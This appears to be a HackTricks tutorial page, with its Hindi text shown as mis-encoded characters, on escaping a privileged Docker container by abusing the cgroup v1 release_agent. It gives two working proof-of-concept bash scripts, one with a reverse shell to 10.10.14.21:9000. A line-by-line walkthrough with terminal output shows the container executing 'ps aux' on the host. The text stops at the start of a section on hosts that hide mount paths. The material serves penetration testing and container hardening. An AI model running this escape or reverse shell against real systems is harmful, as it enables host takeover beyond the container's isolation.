<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>


# `--privileged` рдлреНрд▓реИрдЧ

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="рджреВрд╕рд░рд╛ PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` рдЭрдВрдбрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЪрд┐рдВрддрд╛рдУрдВ рдХреЛ рдкреЗрд╢ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рд╢реЛрд╖рдг рдЗрд╕реЗ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдПрдХ docker рдХрдВрдЯреЗрдирд░ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдЭрдВрдбреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╕рдордп, рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╕рднреА рдЙрдкрдХрд░рдгреЛрдВ рддрдХ рдкреВрд░реНрдг рдкрд╣реБрдБрдЪ рд╣реЛрддреА рд╣реИ рдФрд░ seccomp, AppArmor, рдФрд░ Linux рдХреНрд╖рдорддрд╛рдУрдВ рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдз рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, `--privileged` рдЗрд╕ рд╡рд┐рдзрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ docker рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕реЗ рдХрд╣реАрдВ рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ, "рдХреЗрд╡рд▓" рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ рд╣реИрдВ:

1. рд╣рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рдирд╛ рдЪрд╛рд╣рд┐рдП
2. рдХрдВрдЯреЗрдирд░ рдХреЛ `SYS_ADMIN` Linux рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП
3. рдХрдВрдЯреЗрдирд░ рдореЗрдВ AppArmor рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреА рдХрдореА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдпрд╛ рдЕрдиреНрдпрдерд╛ `mount` syscall рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреА рдЪрд╛рд╣рд┐рдП
4. cgroup v1 рд╡рд░реНрдЪреБрдЕрд▓ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдкрдврд╝рдиреЗ-рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП

`SYS_ADMIN` рдХреНрд╖рдорддрд╛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ mount syscall рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ \(рджреЗрдЦреЗрдВ [man 7 capabilities](https://linux.die.net/man/7/capabilities)\). [Docker рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рд╕реАрдорд┐рдд рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) рдФрд░ `SYS_ADMIN` рдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдЬреЛрдЦрд┐рдо рд╣реЛрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, Docker [рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) рдиреАрддрд┐ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ [mount syscall рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЬрдм рдХрдВрдЯреЗрдирд░ `SYS_ADMIN` рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ рдХрдВрдЯреЗрдирд░ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдЧрд╛ рдпрджрд┐ рдЗрд╕реЗ рдЭрдВрдбреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## рдкреНрд░рдорд╛рдг рдХреЗ рд╕рдВрдХрд▓реНрдкрдирд╛ рдХреЛ рддреЛрдбрд╝рдирд╛

рдЕрдм рдЬрдм рд╣рдо рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рд╕рдордЭрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░рдорд╛рдг рдХреЗ рд╕рдВрдХрд▓реНрдкрдирд╛ рд╢реЛрд╖рдг рдХреЛ рдкрд░рд┐рд╖реНрдХреГрдд рдХрд░ рдЪреБрдХреЗ рд╣реИрдВ, рдЖрдЗрдП рдЗрд╕реЗ рд▓рд╛рдЗрди-рджрд░-рд▓рд╛рдЗрди рдЪрд▓рдХрд░ рджреЗрдЦреЗрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рд╢реЛрд╖рдг рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдПрдХ cgroup рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рд╣рдо рдПрдХ `release_agent` рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ cgroup рдореЗрдВ рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдорд╛рд░рдХрд░ `release_agent` рдЖрд╣реНрд╡рд╛рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдРрд╕рд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рдПрдХ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ рдФрд░ рдПрдХ рдмрд╛рд▓ cgroup рдмрдирд╛рдПрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо рдПрдХ `/tmp/cgrp` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдмрдирд╛рддреЗ рд╣реИрдВ, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдмрд╛рд▓ cgroup \(рдирд╛рдо тАЬxтАЭ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП\) рдмрдирд╛рддреЗ рд╣реИрдВред рд╣рд░ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рддрдХрдиреАрдХ рдЕрдзрд┐рдХрд╛рдВрд╢ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдпрджрд┐ рдЖрдк рд╕рд╛рде рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ рдФрд░ "mount: /tmp/cgrp: special device cgroup does not exist" рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреА рд╕реЗрдЯрдЕрдк рдореЗрдВ RDMA cgroup рдХрдВрдЯреНрд░реЛрд▓рд░ рдирд╣реАрдВ рд╣реИред рдЗрд╕реЗ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `rdma` рдХреЛ `memory` рдореЗрдВ рдмрджрд▓реЗрдВред рд╣рдо RDMA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдореВрд▓ PoC рдХреЗрд╡рд▓ рдЗрд╕рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ cgroup рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рд╡реИрд╢реНрд╡рд┐рдХ рд╕рдВрд╕рд╛рдзрди рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рд┐рднрд┐рдиреНрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХрдИ рдмрд╛рд░ рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдорд╛рдЙрдВрдЯ рдореЗрдВ рдХрд┐рдП рдЧрдП рдкрд░рд┐рд╡рд░реНрддрди рджреВрд╕рд░реЗ рдорд╛рдЙрдВрдЯ рдкрд░ рд▓рд╛рдЧреВ рд╣реЛрдВрдЧреЗред

рд╣рдо рдиреАрдЪреЗ тАЬxтАЭ рдмрд╛рд▓ cgroup рдирд┐рд░реНрдорд╛рдг рдФрд░ рдЗрд╕рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
рдЖрдЧреЗ, рд╣рдо "x" cgroup рдХреЗ рд░рд┐рд▓реАрдЬрд╝ рдкрд░ cgroup рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ рдЙрд╕рдХреА `notify_on_release` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ 1 рд▓рд┐рдЦрдХрд░ред рд╣рдо RDMA cgroup рд░рд┐рд▓реАрдЬрд╝ рдПрдЬреЗрдВрдЯ рдХреЛ рднреА рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╣ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░реЗ тАФ рдЬрд┐рд╕реЗ рд╣рдо рдмрд╛рдж рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдмрдирд╛рдПрдВрдЧреЗ тАФ рд╣реЛрд╕реНрдЯ рдкрд░ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкрде рдХреЛ `release_agent` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдХрдВрдЯреЗрдирд░ рдХрд╛ рдкрде рд╣реЛрд╕реНрдЯ рдкрд░ `/etc/mtab` рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗред

рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣рдо рдЬреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рд╣реЛрд╕реНрдЯ рдкрд░ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИрдВ, рдФрд░ рджреЛрдиреЛрдВ рджреБрдирд┐рдпрд╛ рд╕реЗ рдЙрдиреНрд╣реЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ: рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдкрде рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдЙрдирдХрд╛ рдкрдеред

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдСрдкрд░реЗрд╢рдиреНрд╕ рдХреЛ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
рдзреНрдпрд╛рди рджреЗрдВ `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдкрде рдкрд░, рдЬрд┐рд╕реЗ рд╣рдо рд╣реЛрд╕реНрдЯ рдкрд░ рдмрдирд╛рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ:
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
рдЕрдм, рд╣рдо `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдРрд╕реЗ рдмрдирд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдпрд╣ `ps aux` рдХрдорд╛рдВрдб рдХреЛ рдПрдХреНрдЬреАрдХреНрдпреВрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ рдЗрд╕рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╣реЛрд╕реНрдЯ рдкрд░ рдЖрдЙрдЯрдкреБрдЯ рдлрд╛рдЗрд▓ рдХреЗ рдкреВрд░реНрдг рдкрде рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реБрдП рдХрдВрдЯреЗрдирд░ рдХреЗ `/output` рдореЗрдВ рд╕реЗрд╡ рдХрд░реЗрдЧрд╛ред рдЕрдВрдд рдореЗрдВ, рд╣рдо `/cmd` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдкреНрд░рд┐рдВрдЯ рднреА рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рджреЗрдЦ рд╕рдХреЗрдВ:
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
рдЕрдВрдд рдореЗрдВ, рд╣рдо "x" рдЪрд╛рдЗрд▓реНрдб cgroup рдХреЗ рдЕрдВрджрд░ рддреБрд░рдВрдд рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдХреЗ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `/bin/sh` рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдХрд░ рдФрд░ рдЙрд╕рдХреЗ PID рдХреЛ "x" рдЪрд╛рдЗрд▓реНрдб cgroup рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ `cgroup.procs` рдлрд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдХрд░, `/bin/sh` рдХреЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рдмрд╛рдж рд╣реЛрд╕реНрдЯ рдкрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧреАред рд╣реЛрд╕реНрдЯ рдкрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ `ps aux` рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рдлрд┐рд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ `/output` рдлрд╛рдЗрд▓ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` рдлреНрд▓реИрдЧ v2

рдкрд┐рдЫрд▓реЗ PoCs рддрдм рдЕрдЪреНрдЫреЗ рд╕реЗ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдХрдВрдЯреЗрдирд░ рдХреЛ рдПрдХ storage-driver рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ рдЬреЛ рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рдХрд╛ рдкреВрд░рд╛ рд╣реЛрд╕реНрдЯ рдкрде рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `overlayfs`, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдореИрдВ рдХреБрдЫ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕реЗ рдорд┐рд▓рд╛ рдЬреЛ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╣реЛрд╕реНрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯ рдХреЛ рдкреНрд░рдХрдЯ рдирд╣реАрдВ рдХрд░рддреЗ рдереЗред

## Kata Containers
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/) рдореВрд▓ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреА рд░реВрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ `9pfs` рдХреЗ рдКрдкрд░ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ Kata Containers рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрди рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╕реНрдерд╛рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

\* Kata Containers рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рднрд╡рд┐рд╖реНрдп рдХреЗ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВред

## Device Mapper
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
## рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ PoC

рд╕реНрдкрд╖реНрдЯ рд╣реИ рдХрд┐ рдЗрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХрдВрдЯреЗрдирд░ рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рдкрде рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХреЗ, рдЗрд╕рд▓рд┐рдП рдлреЗрд▓рд┐рдХреНрд╕ рдХрд╛ PoC рдЬреИрд╕рд╛ рд╣реИ рд╡реИрд╕рд╛ рдЗрд╕реНрддреЗрдорд╛рд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдо рдереЛрдбрд╝реА рд╕реВрдЭрдмреВрдЭ рдХреЗ рд╕рд╛рде рдпрд╣ рд╣рдорд▓рд╛ рдЕрднреА рднреА рдЕрдВрдЬрд╛рдо рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рд╡рд╣ рд╣реИ рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рдкреЗрдХреНрд╖ рдкреВрд░реНрдг рдкрде, рдЬрд┐рд╕ рдлрд╛рдЗрд▓ рдХреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реИред рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рдорд╛рдЙрдВрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рд╕реЗ рдЗрд╕реЗ рд╕рдордЭрдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рд╣рдореЗрдВ рдФрд░ рдЬрдЧрд╣ рджреЗрдЦрдирд╛ рд╣реЛрдЧрд╛ред

### рдкреНрд░реЛрдХ рдмрдЪрд╛рд╡ рдХреЗ рд▓рд┐рдП <a id="proc-to-the-rescue"></a>

